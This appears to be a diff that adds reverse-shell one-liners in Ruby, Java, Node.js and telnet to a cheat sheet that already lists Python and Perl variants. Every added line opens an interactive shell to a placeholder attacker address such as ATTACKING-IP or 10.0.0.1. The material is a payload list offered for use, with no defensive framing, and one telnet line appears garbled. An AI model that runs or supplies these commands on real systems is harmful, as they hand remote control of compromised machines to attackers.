@@ -42,6 +42,22 @@ python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SO
 #perl
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP_ADDRESS>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 
+#Ruby
+ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+#Java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+#Node.js
+require('child_process').exec('bash -i >& /dev/tcp/10.0.0.1/80 0>&1');
+
+#telnet
+rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
+
+telnet ATTACKING-IP 80 | /bin/bash | telnet
+
 #encrypted reverse shells
 
 #ncat
